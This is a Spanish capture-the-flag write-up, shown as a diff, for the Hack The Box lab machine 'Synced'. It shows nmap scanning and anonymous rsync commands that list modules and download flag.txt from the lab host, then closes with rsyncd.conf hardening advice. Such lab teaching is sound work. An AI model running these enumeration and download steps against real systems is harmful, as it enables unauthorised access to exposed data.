@@ -1,0 +1,70 @@
+Introducción:
+
+Synced es una máquina de dificultad "Very Easy" de la plataforma Hack The Box. 
+El objetivo principal es aprender a enumerar y explotar el servicio rsync, 
+una utilidad de red muy común para la sincronización de archivos que, si no se configura correctamente, puede permitir el acceso no autorizado a datos sensibles.
+
+IP de la máquina: 10.129.228.37
+
+Sistema Operativo: Linux
+
+Fase de Reconocimiento (Enumeración):
+
+Iniciamos con un escaneo de puertos utilizando Nmap para identificar los servicios activos en el host objetivo.
+
+nmap -sV -sC -p 873 10.129.228.37
+
+Resultados del escaneo:
+
+Puerto 873/tcp: Abierto.
+
+Servicio: rsync (protocolo versión 31)
+
+El hecho de que el puerto 873 esté abierto indica que el servicio rsync está corriendo como un demonio (daemon), 
+lo que nos permite interactuar con él directamente sin necesidad de un túnel SSH.
+
+Explotación (Explotación de Rsync):
+
+El protocolo rsync utiliza "módulos" para organizar los directorios compartidos. Nuestro primer paso es listar qué módulos están disponibles de forma pública (anónima).
+
+Paso 1: Listado de módulos
+Utilizamos el comando rsync con la opción --list-only y la sintaxis de doble dos puntos ::.
+
+rsync --list-only 10.129.228.37::
+
+Output: public Anonymous Share
+
+Identificamos un módulo llamado public. La descripción "Anonymous Share" confirma que la autenticación anónima está permitida.
+
+Enumeración del módulo:
+
+Listamos el contenido del módulo public para ver qué archivos contiene:
+
+rsync --list-only 10.129.228.37::public
+
+Output: -rw-r--r-- 33 2022/10/24 flag.txt
+
+Encontramos el archivo flag.txt en la raíz del recurso compartido.
+
+Post-Explotación (Obtención de la Flag):
+
+Para obtener la flag, procedemos a descargar el archivo a nuestra máquina local (dentro de nuestra carpeta de trabajo):
+
+rsync 10.129.228.37::public/flag.txt.
+cat flag.txt
+Resultado: 
+
+La flag se captura exitosamente, completando el laboratorio.
+
+Conclusión y Recomendaciones (Mitigación):
+
+La vulnerabilidad en esta máquina se debe a una exposición de información por mala configuración. 
+El administrador permitió el acceso de lectura al módulo public sin requerir credenciales ni restringir las direcciones IP de origen.
+
+Recomendaciones de Seguridad:
+
+Autenticación: Configurar el archivo rsyncd.conf con la directiva auth users y un archivo de secretos (secrets file) para exigir contraseñas.
+
+Control de Acceso: Utilizar las directivas hosts allow y hosts deny para restringir el acceso solo a direcciones IP confiables.
+
+Privilegios: Asegurarse de que el demonio rsync se ejecute con privilegios mínimos y en un entorno chroot si es posible.
